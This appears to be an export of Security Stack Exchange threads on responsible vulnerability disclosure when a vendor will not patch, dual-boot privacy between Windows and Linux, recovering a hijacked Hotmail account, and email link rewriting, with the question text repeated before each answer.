Which is true, but that's a bullshit argument. That's like saying &quot;You don't have to validate parameters on the backend because the frontend does the validation&quot; or &quot;You don't have to encrypt passwords because unprivileged users shouldn't be able to read the password database anyway.&quot; And I have already demonstrated how it can be exploited (&quot;Well, then you need to fix your settings.&quot;).</p>
<p>I am really annoyed that instead of thanking me for letting them know there's a problem, they first deny it, then acknowledge it, but downplay the risk, and then don't even fix it.
I'm sure they haven't notified any of their other customers of the issue.
My client says &quot;Well, that's their own problem&quot;, but I really feel the other customers should know, so they can make an informed decision whether to keep doing business with this company. Also, they would probably be able to pressure them into fixing the issue.</p>
<p>So what can I do? I guess I should first wait for the vendor to get back to my client with a timeline for fixing the issue (as if one year of doing nothing wasn't bad enough).
And then?
I don't want to disclose it publicly, because I really care about their customers. I also don't want to give them a deadline for fixing it, because I'm worried it could be interpreted as a threat.</p>
<p>But, if they don't fix this, would you talk to their other customers (large corporations)? I think that would probably put pressure on them to fix the problem. But it would also be immediately clear that the info was passed on by me. And I don't want to get into trouble with my client.</p>
","40","6","264634","<p>It sounds like you're insisting on an issue being treated as high priority, but there is little evidence for this. In your own words from comments,</p>
<blockquote>
<p>Think of it like a really bad vulnerability (like SQL injection) that can only be exploited if some software is run under an admin account (made up example). SQL injection is something that just shouldn't be possible in 2022, but they refuse to fix it because &quot;Well, don't use an admin account&quot;. SQL injection is a serious flaw, it should be fixed out of principle, IMHO</p>
</blockquote>
<p>Few companies will agree to make changes to working code &quot;out of principle&quot;. If a bug can only be exploited in case of misconfiguration, they are more likely to add a warning to the manual and leave it at that. And it's not like they are objectively wrong. Based on what you've said, this vulnerability doesn't affect your client, you don't know whether there are any affected customers at all, and it requires unsafe configuration to be exploitable. Setting your aesthetic preferences aside, this doesn't sound high-priority.</p>
<p>Answering your question &quot;what to do&quot; - nothing. You've informed your client (and made sure they aren't affected), they've informed the vendor, it's their responsibility now. Surely your desire to rid the world of this security threat is commendable, but I'm afraid this isn't the greatest vulnerability in the systems any of the other customers are using.</p>
","31"
"264626","264626","Software vendor refuses to fix security vulnerability - what to do?","<p>I work as a consultant for a large corporation that uses some software, in which I have found a security vulnerability. I notified both my client and the software vendor about a year ago. They referred the case to their account manager (!), who (in a polite way) said: &quot;Your consultant is full of shit.&quot;
Luckily, the client got my back, and after a little back and forth they reluctantly agreed to release a patch. Just for my client, not for anyone else. It turned out to be a patch only for the client code, not fixing the underlying vulnerability on the server side.
When I pointed that out, they said: &quot;Yeah, sorry, but that's too much work. We consider that a customization request. If you pay for it, we can fix it.&quot;</p>
<p>I believe my client is currently negotiating license renewal with them and I'm assuming they are using this as a bargaining chip (the details are above my paygrade). However, I was asked for input, and it seems like, after pressure from my client, and just one year after being made aware of the issue, they have agreed to add it to their backlog as a &quot;feature request&quot;, finally admitting it's actually a security vulnerability. My client is currently pushing for an implementation date, but I'm not getting my hopes up.</p>
<p>Their argument for delaying the implementation? &quot;It's not an issue if everything else is set up correctly.&quot;
Which is true, but that's a bullshit argument. That's like saying &quot;You don't have to validate parameters on the backend because the frontend does the validation&quot; or &quot;You don't have to encrypt passwords because unprivileged users shouldn't be able to read the password database anyway.&quot; And I have already demonstrated how it can be exploited (&quot;Well, then you need to fix your settings.&quot;).</p>
<p>I am really annoyed that instead of thanking me for letting them know there's a problem, they first deny it, then acknowledge it, but downplay the risk, and then don't even fix it.
I'm sure they haven't notified any of their other customers of the issue.
My client says &quot;Well, that's their own problem&quot;, but I really feel the other customers should know, so they can make an informed decision whether to keep doing business with this company. Also, they would probably be able to pressure them into fixing the issue.</p>
<p>So what can I do? I guess I should first wait for the vendor to get back to my client with a timeline for fixing the issue (as if one year of doing nothing wasn't bad enough).
And then?
I don't want to disclose it publicly, because I really care about their customers. I also don't want to give them a deadline for fixing it, because I'm worried it could be interpreted as a threat.</p>
<p>But, if they don't fix this, would you talk to their other customers (large corporations)? I think that would probably put pressure on them to fix the problem. But it would also be immediately clear that the info was passed on by me. And I don't want to get into trouble with my client.</p>
","40","6","264646","<p>You could publish a security advisory yourself, without disclosing the details necessary for exploitation. A common place for the publication would be the CVE database, which has an online <a href=""https://cveform.mitre.org/"" rel=""noreferrer"">submission form</a> with instructions.</p>
<p>Include at least the following:</p>
<ul>
<li>Affected product name and versions that you know of.</li>
<li>Worst case effect of the vulnerability. Can someone alter or remove data? Download something secret? Execute unauthorized code on the server?</li>
<li>Required access for vulnerability. Does it require an user account? Access to local machine or network?</li>
<li>You mentioned that some settings affect the vulnerability. Include the settings that can be used to avoid the problem.</li>
</ul>
<p>It's probably good courtesy to post a draft of your submission to your client and the vendor for preview first, but you don't really need the vendor's permission to publish it.</p>
","7"
"264626","264626","Software vendor refuses to fix security vulnerability - what to do?","<p>I work as a consultant for a large corporation that uses some software, in which I have found a security vulnerability. I notified both my client and the software vendor about a year ago. They referred the case to their account manager (!), who (in a polite way) said: &quot;Your consultant is full of shit.&quot;
Luckily, the client got my back, and after a little back and forth they reluctantly agreed to release a patch. Just for my client, not for anyone else. It turned out to be a patch only for the client code, not fixing the underlying vulnerability on the server side.
When I pointed that out, they said: &quot;Yeah, sorry, but that's too much work. We consider that a customization request. If you pay for it, we can fix it.&quot;</p>
<p>I believe my client is currently negotiating license renewal with them and I'm assuming they are using this as a bargaining chip (the details are above my paygrade). However, I was asked for input, and it seems like, after pressure from my client, and just one year after being made aware of the issue, they have agreed to add it to their backlog as a &quot;feature request&quot;, finally admitting it's actually a security vulnerability. My client is currently pushing for an implementation date, but I'm not getting my hopes up.</p>
<p>Their argument for delaying the implementation? &quot;It's not an issue if everything else is set up correctly.&quot;
Which is true, but that's a bullshit argument. That's like saying &quot;You don't have to validate parameters on the backend because the frontend does the validation&quot; or &quot;You don't have to encrypt passwords because unprivileged users shouldn't be able to read the password database anyway.&quot; And I have already demonstrated how it can be exploited (&quot;Well, then you need to fix your settings.&quot;).</p>
<p>I am really annoyed that instead of thanking me for letting them know there's a problem, they first deny it, then acknowledge it, but downplay the risk, and then don't even fix it.
I'm sure they haven't notified any of their other customers of the issue.
My client says &quot;Well, that's their own problem&quot;, but I really feel the other customers should know, so they can make an informed decision whether to keep doing business with this company. Also, they would probably be able to pressure them into fixing the issue.</p>
<p>So what can I do? I guess I should first wait for the vendor to get back to my client with a timeline for fixing the issue (as if one year of doing nothing wasn't bad enough).
And then?
I don't want to disclose it publicly, because I really care about their customers. I also don't want to give them a deadline for fixing it, because I'm worried it could be interpreted as a threat.</p>
<p>But, if they don't fix this, would you talk to their other customers (large corporations)? I think that would probably put pressure on them to fix the problem. But it would also be immediately clear that the info was passed on by me. And I don't want to get into trouble with my client.</p>
","40","6","264657","<p>Did you get permission from the vendor to perform penetration testing?</p>
<p>Read the ToS carefully, you may have breached an agreement in which your employer agreed to basically not pen-test the software in any way.</p>
<blockquote>
<p>The main thing that separates a penetration tester from an attacker is permission. The penetration tester will have permission from the owner of the computing resources that are being tested.</p>
</blockquote>
<p>Source: <a href=""https://www.techrepublic.com/article/dont-let-a-penetration-test-land-you-in-legal-hot-water/"" rel=""nofollow noreferrer"">https://www.techrepublic.com/article/dont-let-a-penetration-test-land-you-in-legal-hot-water/</a></p>
","-1"
"264626","264626","Software vendor refuses to fix security vulnerability - what to do?","<p>I work as a consultant for a large corporation that uses some software, in which I have found a security vulnerability. I notified both my client and the software vendor about a year ago. They referred the case to their account manager (!), who (in a polite way) said: &quot;Your consultant is full of shit.&quot;
Luckily, the client got my back, and after a little back and forth they reluctantly agreed to release a patch. Just for my client, not for anyone else. It turned out to be a patch only for the client code, not fixing the underlying vulnerability on the server side.
When I pointed that out, they said: &quot;Yeah, sorry, but that's too much work. We consider that a customization request. If you pay for it, we can fix it.&quot;</p>
<p>I believe my client is currently negotiating license renewal with them and I'm assuming they are using this as a bargaining chip (the details are above my paygrade). However, I was asked for input, and it seems like, after pressure from my client, and just one year after being made aware of the issue, they have agreed to add it to their backlog as a &quot;feature request&quot;, finally admitting it's actually a security vulnerability. My client is currently pushing for an implementation date, but I'm not getting my hopes up.</p>
<p>Their argument for delaying the implementation? &quot;It's not an issue if everything else is set up correctly.&quot;
Which is true, but that's a bullshit argument. That's like saying &quot;You don't have to validate parameters on the backend because the frontend does the validation&quot; or &quot;You don't have to encrypt passwords because unprivileged users shouldn't be able to read the password database anyway.&quot; And I have already demonstrated how it can be exploited (&quot;Well, then you need to fix your settings.&quot;).</p>
<p>I am really annoyed that instead of thanking me for letting them know there's a problem, they first deny it, then acknowledge it, but downplay the risk, and then don't even fix it.
I'm sure they haven't notified any of their other customers of the issue.
My client says &quot;Well, that's their own problem&quot;, but I really feel the other customers should know, so they can make an informed decision whether to keep doing business with this company. Also, they would probably be able to pressure them into fixing the issue.</p>
<p>So what can I do? I guess I should first wait for the vendor to get back to my client with a timeline for fixing the issue (as if one year of doing nothing wasn't bad enough).
And then?
I don't want to disclose it publicly, because I really care about their customers. I also don't want to give them a deadline for fixing it, because I'm worried it could be interpreted as a threat.</p>
<p>But, if they don't fix this, would you talk to their other customers (large corporations)? I think that would probably put pressure on them to fix the problem. But it would also be immediately clear that the info was passed on by me. And I don't want to get into trouble with my client.</p>
","40","6","264669","<p>This is the really old topic on how to disclose vulnerabilities.</p>
<p><em>(note on terminology: I am using 'company' for the one that made the software, 'researcher' for the one who finds the vulnerability and 'client' for the person or business that installed the software and requested the pentest)</em></p>
<p>The company that made the software may prefer not to patch anything (less work), and that you don't tell anyone that their software has defects (in this case, a vulnerability)</p>
<p>As a researcher, you consider this to be important and that it deserves to be fixed promptly.</p>
<p>Other customers using this software are sometimes argued to be secure if you don't disclose the details. However, it doesn't avoid that someone else (perhaps with more nefarious purposes) finds the same vulnerability (there are enough examples of concurrent discoveries, several people finding the same vulnerability with no prior knowledge of the work of the other). Not letting those other clients know that there is a vulnerability in that software also puts them at risk by denying them the ability of taking protective measures that they might have used had they known about it.</p>
<p>Each security researcher/team has its own policy, but the usual compromise between those two positions is that the company is notified of the security vulnerability, with a notice that it will be made public after a fixed time (usually 90 days <em>even if it's not fixed by then</em>).</p>
<p>This should be enough time for the company to assess the problem and fix it. Sometimes the company requests a larger embargo period, to which the researcher may agree or not (at this point they will probably think if the request is reasonable based on their interactions on this period).</p>
<p>(If the company releases a fix earlier, the researcher publishes their discovery at that point)</p>
<p>These are obviously generalizations: There are companies striving to fix security vulnerabilities in their products in much shorter timeframes, and researchers that advocate for immediately publishing all vulnerability details, with no margin for the companies.</p>
<p>In this case, as there was no prior timeline proposed, that would need to be stated: &quot;It has already been a year with no fix on the horizon, we are concerned that your users are at risk, and we plan to publish the vulnerability at X date (e.g. January 15th 2023)&quot;. It's then up to the company to decide if the development of the fix should be given more priority or not.</p>
<hr />
<p><strong>So, what happens if the embargo period passes, there is no fix and the researcher decides to publish it?</strong></p>
<p>Advisories can be shorter or longer, but there are a number of things that should be present:</p>
<ul>
<li>The product and version(s) affected</li>
<li>A brief summary of the issue (e.g. &quot;there is a SQL injection&quot;, &quot;a local user could escalate to admin)</li>
<li>In which version it is fixed (if there is none, that there is none)</li>
<li>Available mitigations and workarounds (e.g. the device should only be placed on an isolated network before this is fixed)</li>
<li>Timeline (the different dates in which you contacted the company, or they contacted you back)</li>
</ul>
<p>Plus any other relevant information you might want to include. Some people include the PoC (or publish it but after a further delay). Others publish a video. Some vulnerabilities are even the basis of papers later presented in conferences.</p>
<p>Then, the readers will reach their own conclusions.</p>
<p>A company not fixing a serious issue for a year won't look good. Whereas it may be more amenable to a minor issue, or one not affecting those interested in the advisory.</p>
<p>At the same time, if your report is flawed, you won't have any credibility. For instance, you can expect it to be received with a smile if it described as a vulnerability that the system is unbootable if the user logs in with the Administrator account and deletes <code>C:\Windows</code>.</p>
<p>Note that a good report doesn't need to be &quot;big&quot;. It should just be truthful. There are big vulnerabilities and small vulnerabilities. And the same vulnerability will have different impacts on several clients.</p>
<p>Also, in some cases the &quot;fix&quot; might even end up just as a documentation update explaining that the system MUST NOT be setup in certain way because that would be insecure.</p>
<p>Regarding their explanation, I would prefer not to weigh in without knowing the specifics (that you obviously won't be able to share). In some cases it does make sense to treat the system as a whole (for instance the contract between the frontend and the backend of certain software might state that the validation is done by the frontend classes), and in others it's completely unsustainable. I have also heard that &quot;It's not an issue if everything else is set up correctly.&quot; argument in cases that I didn't agree with.</p>
<p>Still, you shall admit that if the issue is not exploitable due to other measures they have set up (and, as they expect everyone would configure the system &quot;correctly&quot;…), that they consider this security problem a minor issue, and haven't prioritized it.</p>
<p>  ‎</p>
<p>Finally, there's another point to take into account in this specific case. So far, we have considered the company making the product and the researcher finding the defect. However, in this case there is a third party which is the client that tasked you with performing the pentest and -likely- owns the results and has a say on how they can be used. So far, they seem to be using this for negotiating the license renewal.</p>
<p>The argument «Well, that's their own problem» is a risky one. On the one hand your client has taken the monetary cost of performing a pentest of the application, why should it be benefiting the company or other customers (which might even be their competitors!) with their own funds? On the other hand, cooperation is a better strategy for obtaining secure systems. How do they know that other client didn't find another vulnerability (one you missed) and is sitting on that as well?</p>
<p>  ‎</p>
<blockquote>
<p>would you talk to their other customers</p>
</blockquote>
<p><strong>No</strong>. You don't publish the results without your client permission. If your client gets a hefty discount in exchange of never telling anyone of the vulnerability, you would have to get your mouth shut (I guess, review the provisions of the contract with your client for the actual details).</p>
<p>If you want to do this in the future, you would include in the future contracts with your clients some provisions for that, stating that you are allowed to communicate any vulnerabilities you find to the vendor, that after X months (or earlier if authorized by your client) you can publish the details, that your client must credit you as the one that found the vulnerability… what you deem fit (and your clients accept).</p>
<p>Even then, assuming your contract said that, contacting out of the blue other companies like that would be a bad idea. It would be far better to publish the results in your blog, then the advisory itself to the usual lists, referencing the blog post. And you should really get a CVE assigned to it.</p>
<p>Once your vulnerability is listed with a CVE, it should appear on the radar of all security teams using that software (with a proper process for vulnerability handling). If you were inviting enough in your blog post (offering to provide additional advice to affected customers, perhaps even including a bit of publicity at the bottom remembering that you are available for hire if they need to pentest a setup of that software) you may receive some queries.</p>
<p>Had you worked with other companies using that software, a quick note to your contact there pointing out to your new post could be adequate, but I wouldn't cold-email those companies.</p>
","13"
"264626","264626","Software vendor refuses to fix security vulnerability - what to do?","<p>I work as a consultant for a large corporation that uses some software, in which I have found a security vulnerability. I notified both my client and the software vendor about a year ago. They referred the case to their account manager (!), who (in a polite way) said: &quot;Your consultant is full of shit.&quot;
Luckily, the client got my back, and after a little back and forth they reluctantly agreed to release a patch. Just for my client, not for anyone else. It turned out to be a patch only for the client code, not fixing the underlying vulnerability on the server side.
When I pointed that out, they said: &quot;Yeah, sorry, but that's too much work. We consider that a customization request. If you pay for it, we can fix it.&quot;</p>
<p>I believe my client is currently negotiating license renewal with them and I'm assuming they are using this as a bargaining chip (the details are above my paygrade). However, I was asked for input, and it seems like, after pressure from my client, and just one year after being made aware of the issue, they have agreed to add it to their backlog as a &quot;feature request&quot;, finally admitting it's actually a security vulnerability. My client is currently pushing for an implementation date, but I'm not getting my hopes up.</p>
<p>Their argument for delaying the implementation? &quot;It's not an issue if everything else is set up correctly.&quot;
Which is true, but that's a bullshit argument. That's like saying &quot;You don't have to validate parameters on the backend because the frontend does the validation&quot; or &quot;You don't have to encrypt passwords because unprivileged users shouldn't be able to read the password database anyway.&quot; And I have already demonstrated how it can be exploited (&quot;Well, then you need to fix your settings.&quot;).</p>
<p>I am really annoyed that instead of thanking me for letting them know there's a problem, they first deny it, then acknowledge it, but downplay the risk, and then don't even fix it.
I'm sure they haven't notified any of their other customers of the issue.
My client says &quot;Well, that's their own problem&quot;, but I really feel the other customers should know, so they can make an informed decision whether to keep doing business with this company. Also, they would probably be able to pressure them into fixing the issue.</p>
<p>So what can I do? I guess I should first wait for the vendor to get back to my client with a timeline for fixing the issue (as if one year of doing nothing wasn't bad enough).
And then?
I don't want to disclose it publicly, because I really care about their customers. I also don't want to give them a deadline for fixing it, because I'm worried it could be interpreted as a threat.</p>
<p>But, if they don't fix this, would you talk to their other customers (large corporations)? I think that would probably put pressure on them to fix the problem. But it would also be immediately clear that the info was passed on by me. And I don't want to get into trouble with my client.</p>
","40","6","264688","<p>Consider the impact to your personal brand of any action you decide to take.</p>
<p>If you want to earn hero points as a security researcher, the disclosure options might be beneficial.</p>
<p>If your industry is niche and your clients appreciate discretion, you might want to avoid any course of action that makes it look like you are washing dirty laundry in public. Disclosure may be perceived as an admission that the client was using vulnerable software. That could have PR consequences.</p>
<p>As a consultant, you need to think about the impression your next client will have of you. Maybe they will appreciate a hero security researcher who can come in and secure their systems. Maybe the last thing they want is a disruptive influence who makes a lot of noise over a minor issue.</p>
","2"
"264621","264621","Can Windows invade my privacy by accessing files from my Linux OS?","<p>I have a 500 GB SSD drive with Windows 10 installed, and a 250 GB SSD drive with Ubuntu 22.04 installed. I use the latter mainly to maintain my privacy; Ubuntu is like my personal computer, with private stuff. I don't really use Windows, but I need it for my job.</p>
<p>My question is: Can Windows access my personal files from the Linux drive? Windows are closed-source, and Microsoft is known for being a <a href=""https://tosdr.org/en/service/244"" rel=""nofollow noreferrer"">privacy nightmare</a>; I'm curious if there's been a case like that.</p>
<p>If that's true, how do you recommend me to protect myself? I'm interested to protect just one directory that contains private stuff. Should I encrypt just that directory alone, or the entire drive? Is it possible (not probable just possible), even that way, for Windows to add malicious stuff to my other drive so it can access my files once decrypted?</p>
","1","3","264624","<p>It is not impossible for Microsoft to see files on another partition.  If found it would be a PR nightmare, hopefully that's enough to stop them from doing it.</p>
<blockquote>
<p>not probable, just possible</p>
</blockquote>
<p>Just about anything is possible.  Windows could install a keylogger into the BIOS which looks for a LUKS partition password and the next time it starts uses it to decrypt the partition.  It's possible to do this over an airgap.</p>
<p>But yea, being reasonable about our threats, LUKS partition encryption is probably safest against reasonable attack vectors.</p>
","2"
"264621","264621","Can Windows invade my privacy by accessing files from my Linux OS?","<p>I have a 500 GB SSD drive with Windows 10 installed, and a 250 GB SSD drive with Ubuntu 22.04 installed. I use the latter mainly to maintain my privacy; Ubuntu is like my personal computer, with private stuff. I don't really use Windows, but I need it for my job.</p>
<p>My question is: Can Windows access my personal files from the Linux drive? Windows are closed-source, and Microsoft is known for being a <a href=""https://tosdr.org/en/service/244"" rel=""nofollow noreferrer"">privacy nightmare</a>; I'm curious if there's been a case like that.</p>
<p>If that's true, how do you recommend me to protect myself? I'm interested to protect just one directory that contains private stuff. Should I encrypt just that directory alone, or the entire drive? Is it possible (not probable just possible), even that way, for Windows to add malicious stuff to my other drive so it can access my files once decrypted?</p>
","1","3","264627","<p><em>how do you recommend me to protect myself?</em></p>
<p>The best two fail safe options are;</p>
<ol>
<li>Run Windows through a VM rather than have it on a sperate partition or drive.</li>
<li>Have two PC's, one for Windows and one for Linux.</li>
</ol>
<p>If you encrypt the directory as you suggested, it is an option but not as safe as the tools to decrypt those files are still the same machine rather than sandboxed.</p>
","1"
"264621","264621","Can Windows invade my privacy by accessing files from my Linux OS?","<p>I have a 500 GB SSD drive with Windows 10 installed, and a 250 GB SSD drive with Ubuntu 22.04 installed. I use the latter mainly to maintain my privacy; Ubuntu is like my personal computer, with private stuff. I don't really use Windows, but I need it for my job.</p>
<p>My question is: Can Windows access my personal files from the Linux drive? Windows are closed-source, and Microsoft is known for being a <a href=""https://tosdr.org/en/service/244"" rel=""nofollow noreferrer"">privacy nightmare</a>; I'm curious if there's been a case like that.</p>
<p>If that's true, how do you recommend me to protect myself? I'm interested to protect just one directory that contains private stuff. Should I encrypt just that directory alone, or the entire drive? Is it possible (not probable just possible), even that way, for Windows to add malicious stuff to my other drive so it can access my files once decrypted?</p>
","1","3","264675","<p>If you assume simply generally sloppy/user-unfriendly data access: you're fine. Windows can't do anything (e.g. access flash drives or network data) while it's not running, and doesn't know how to parse Linux file systems so it can't read your Ubuntu drive (unless you for some reason formatted it with NTFS, UDF, or a FAT variant rather than Linux defaults like ext4 or btrfs) when it is running. To Windows, the other SSD is a black box of meaningless nonsense.</p>
<p>However, that won't necessarily stand up against an <em>actively malicious</em> piece of software. It's very unlikely that Microsoft starts shipping an ext or btrfs driver with Windows, but it's possible; NT drivers for such file systems do exist, or there's things like WSL (which is disabled by default still) which could mount the other volume if granted access. Similarly it's extremely unlikely that any not-specifically-targeting-you piece of Windows malware is going to bother to include support for Linux file systems, so the other SSD will be meaningless nonsense to them too. But it's not <em>impossible</em>.</p>
<p>Similarly, it's not <em>impossible</em> for Windows (or highly-privileged and advanced malware running on it) to bypass nearly any protection you could put in place. For example, it could easily lift your entire Linux machine into a transparent VM, such that even when you <em>think</em> you've shut down Windows and rebooted into Linux, it's actually still running there, with a lower-level access, able to watch everything. Similarly, as another user mentioned, it might be able to install a keylogger into the machine firmware and can definitely overwrite the Linux bootloader, to introduce a keylogger that captures your disk encryption password. The only real protection is to use a totally separate machine.</p>
<p>On the other hand, you really don't need to be that paranoid about this. Microsoft has no interest in monitoring what you do in Linux; it has reasonably-legit reasons for the monitoring it does in Windows (most of which can be turned off) that mostly wouldn't even apply to Linux and certainly wouldn't be worth the development effort. Not to mention the PR shitstorm when it eventually came out. Windows might be closed source, but that doesn't mean it's an unknowable block box of mystery; there are almost certainly more people monitoring every network packet their Windows machine sends or receives than there are who have read more than 0.1% of the Ubuntu source code, not to mention the thousands of Microsoft employees who work on Windows and related stuff (meaning they do get to see the source code) but do in fact have ethics and sufficiently well-padded bank accounts that most would be willing to object internally to such overreach (which might make the news) and some who would be willing to publicly blow the whistle on it (which would definitely make the news).</p>
","2"
"264586","264586","Is my Hotmail compromised as many emails have been sent automatically?","<p>There were hundreds of emails sent from my Hotmail account between 30 Aug to 1 Sept to many Hotmail and Outlook addresses with <code>sECURED.shtml</code> attachment of 764KB. Some emails were not delivered and deleted from my inbox automatically. How can I track who did this or which program/app is doing this? Is my email compromised? Also what measures shall I take to secure my email account?</p>
","0","3","264587","<p>If you did not send the emails, then, yes, your account is clearly compromised.</p>
<p>Your Hotmail account should have a log of who logged in, which you can check.</p>
<p>The advice on securing online accounts are pretty standard over the past few years:</p>
<ul>
<li>reset your password to a strong, unguessable password</li>
<li>enable two-factor authentication/multi-factor authentication</li>
</ul>
<p>You need to work with Hotmail support to help through the rest of it and conduct an investigation.</p>
","1"
"264586","264586","Is my Hotmail compromised as many emails have been sent automatically?","<p>There were hundreds of emails sent from my Hotmail account between 30 Aug to 1 Sept to many Hotmail and Outlook addresses with <code>sECURED.shtml</code> attachment of 764KB. Some emails were not delivered and deleted from my inbox automatically. How can I track who did this or which program/app is doing this? Is my email compromised? Also what measures shall I take to secure my email account?</p>
","0","3","264590","<p>Were the e-mails actually sent from your account, or was your e-mail address just used as the sender address of this malware wave?</p>
<p>Both options are possible.</p>
<ul>
<li>In the first case you need to secure your account as explained before, of course. You also need to find out if
<ul>
<li>your PC is also compromised (and the mails were sent from your PC),</li>
<li>the password was somehow stolen, but the mail was sent from external IP addresses through your account,</li>
<li>or you may have inadvertantly given your account credentials to a bad actor by falling for a phishing attack (something like &quot;we need to check your account, please log in here...&quot;).</li>
</ul>
</li>
<li>In the second case there is little you can do as your account wasn't actually involved in sending the bad mails.</li>
</ul>
<p>So the first thing you should do (perhaps with help from some mail expert) is to analyze the bounces to see where the e-mails originated and which of these cases apply. Doing a thorough malware check on your PC isn't a bad idea in any case if you don't already do that regularly.</p>
","-1"
"264586","264586","Is my Hotmail compromised as many emails have been sent automatically?","<p>There were hundreds of emails sent from my Hotmail account between 30 Aug to 1 Sept to many Hotmail and Outlook addresses with <code>sECURED.shtml</code> attachment of 764KB. Some emails were not delivered and deleted from my inbox automatically. How can I track who did this or which program/app is doing this? Is my email compromised? Also what measures shall I take to secure my email account?</p>
","0","3","264604","<p><em>How can I track who did this or which program/app is doing this? Is my email compromised?</em></p>
<p>You can access your account history through <a href=""https://account.live.com/Activity"" rel=""nofollow noreferrer"">https://account.live.com/Activity</a>
This is the link I obtained from <a href=""https://support.microsoft.com/en-us/account-billing/check-the-recent-sign-in-activity-for-your-microsoft-account-5b3cfb8e-70b3-2bd6-9a56-a50177863357"" rel=""nofollow noreferrer"">https://support.microsoft.com/en-us/account-billing/check-the-recent-sign-in-activity-for-your-microsoft-account-5b3cfb8e-70b3-2bd6-9a56-a50177863357</a></p>
<p><em>Also what measures shall I take to secure my email account?</em></p>
<p>To really be secure you need to know what happened first, it is no good only resetting your password if you have a keylogger installed for example. If you suspect you may have any malware, it is best to do a clean install in addition to resetting any passwords. However this can be tricky if you have multiple devices, so you need to also think did you access your account from a mobile device? could it have been on an unsecured network? You should run virus scans as it might detect which device has been compromised.</p>
<p>If it were me I would first reset the password, factory reset or format any devices with that email account and then reset the password a second time.</p>
<p>I would also ensure not to open any of those emails, especially the attachment.</p>
","0"
"264533","264533","Is URL rewriting in e-mail a sound security practice?","<p>Our work e-mail server has started rewriting links in incoming mail through a redirecting gateway, for &quot;security reasons&quot;: if I receive an e-mail containing a link to
<code>https://security.stackexchange.com</code>, the link gets rewritten to</p>
<pre><code>https://es.sonicurlprotection-fra.com/click?PV=2&amp;MSGID=202209021358500174760&amp;URLID=1&amp;ESV=10.0.18.7423&amp;IV=D329C6F4AF0738E931FA9F0EAAD309B2&amp;TT=1662127131399&amp;ESN=kgatDRmAwf3NdgkHDeepamZT4x4VYB71UZXeLJNkMQ0%3D&amp;KV=1536961729280&amp;B64_ENCODED_URL=aHR0cHM6Ly9zZWN1cml0eS5zdGFja2V4Y2hhbmdlLmNvbQ&amp;HK=B0A81618C6DD8CBAFF5376A265D02328AB2DA6B2A64AA8DA59F1662AC2089052 
</code></pre>
<p>before the mail arrives into my Inbox. Clicking on this opaque blob redirects me to <code>https://security.stackexchange.com</code>.</p>
<p>Presumably, the idea is that if the target address turns out to be malicious then the mail server provider (Sonicwall) can decide to block the link even retroactively in messages that have already been delivered.</p>
<p>Is this kind of link tracking considered good security practice? Are there any authoritative opinions on it from researchers, for instance?  At a first thought, I can come up with many disadvantages, and minimal advantages (but I am no security expert).</p>
<p>I have tried looking for opinions online, but the only articles I find come from people that are trying to sell similar technology, so they might be biased: for instance <a href=""https://www.darkreading.com/edge-articles/why-secure-email-gateways-rewrite-links-and-why-they-shouldn-t-"" rel=""noreferrer"">this</a>, <a href=""https://www.vadesecure.com/en/blog/rethinking-url-rewriting-in-email-security"" rel=""noreferrer"">this</a> and <a href=""https://www.tessian.com/blog/why-url-rewriting-is-not-effective/"" rel=""noreferrer"">this</a>.</p>
","50","4","264537","<p><strong>The best</strong> security can be provided if the <strong>link gets analyzed at the moment it is visited</strong>. At this time the most recent reputation information about link and domain are available. And ideally the actual content behind the URL from the perspective of the visitor should be included in the decision too. This can be achieved if <strong>all web traffic of the user is analyzed in a TLS intercepting web proxy</strong>, as often included in corporate firewalls. Since everything is passed through the proxy no explicit URL rewriting need to be done.</p>
<p>Passing all web traffic over an analyzing proxy can not be done in all situations though, especially not if the access device is not in full control of the company - like when using devices not in full control of the company (BYOD). And TLS interception might be seen as a problem too, sometimes for performance reasons and often for privacy.</p>
<p><strong>The second best</strong> option is thus not to have the actual content of the page from the perspective of the user, but at least <strong>analyze the link at the time of access</strong> to get the latest reputation information and to also check the content of the page from the perspective of the analyzer. This might be the same as seen from the user, but some sites detect analyzers and provide them different (innocent) content than the actual victims. This second best option can be achieved with <strong>URL rewriting</strong> in the receiving mail server. It might also be achievable with a plugin in the mail client or the browser which checks the link against some API or rewrites the link only at the time of access. Such plugins are specific for the mail  client or browser though, need to be explicitly installed (might be done automatically on company managed devices) and might not be available for all clients.</p>
<p>URL rewriting (and plugin and web proxies) also allow interaction with the user, i.e. if the decision is not fully clear the user might be warned about potential problems but might be offered to continue if they are sure that the link is trusted. This reduces the impact of false positives.</p>
<p>URL rewriting in the receiving mail server has its clear problems though: anything which relies on the mail being unchanged (i.e. PGP, S/MIME or DKIM signatures) will complain about a changed mail. And URL rewriting is not possible with encrypted mails, while a web proxy still protects in this case too.</p>
<p><strong>The worst</strong> option (apart from no checks at all) is to <strong>check the link ONLY when the mail arrives</strong> at the mail server. At this time there are much less reputation information available about the link, so the chance of missing a problem is much higher. Also the decision at this time is final, i.e. either the mail is blocked (or the link removed) or passed through without changes. So false positives must be reduced as much as possible which leads to an even higher rate of false negatives, i.e. of not detecting attacks. Of course, filtering obviously bad mails at this early stage is a good idea, and this option can also be used together with URL rewriting or access via proxy.</p>
<p><strong>In summary</strong>: None of the offered solutions is perfect, each has its own problems. URL rewriting is a good alternative if analysis of all traffic in an TLS intercepting web proxy or if the installation of a security plugin in the mail client is not an option. It has its problems though with any kind of signed mails.</p>
","4"
"264533","264533","Is URL rewriting in e-mail a sound security practice?","<p>Our work e-mail server has started rewriting links in incoming mail through a redirecting gateway, for &quot;security reasons&quot;: if I receive an e-mail containing a link to
<code>https://security.stackexchange.com</code>, the link gets rewritten to</p>
<pre><code>https://es.sonicurlprotection-fra.com/click?PV=2&amp;MSGID=202209021358500174760&amp;URLID=1&amp;ESV=10.0.18.7423&amp;IV=D329C6F4AF0738E931FA9F0EAAD309B2&amp;TT=1662127131399&amp;ESN=kgatDRmAwf3NdgkHDeepamZT4x4VYB71UZXeLJNkMQ0%3D&amp;KV=1536961729280&amp;B64_ENCODED_URL=aHR0cHM6Ly9zZWN1cml0eS5zdGFja2V4Y2hhbmdlLmNvbQ&amp;HK=B0A81618C6DD8CBAFF5376A265D02328AB2DA6B2A64AA8DA59F1662AC2089052 
</code></pre>
<p>before the mail arrives into my Inbox. Clicking on this opaque blob redirects me to <code>https://security.stackexchange.com</code>.</p>
<p>Presumably, the idea is that if the target address turns out to be malicious then the mail server provider (Sonicwall) can decide to block the link even retroactively in messages that have already been delivered.</p>
<p>Is this kind of link tracking considered good security practice? Are there any authoritative opinions on it from researchers, for instance?  At a first thought, I can come up with many disadvantages, and minimal advantages (but I am no security expert).</p>
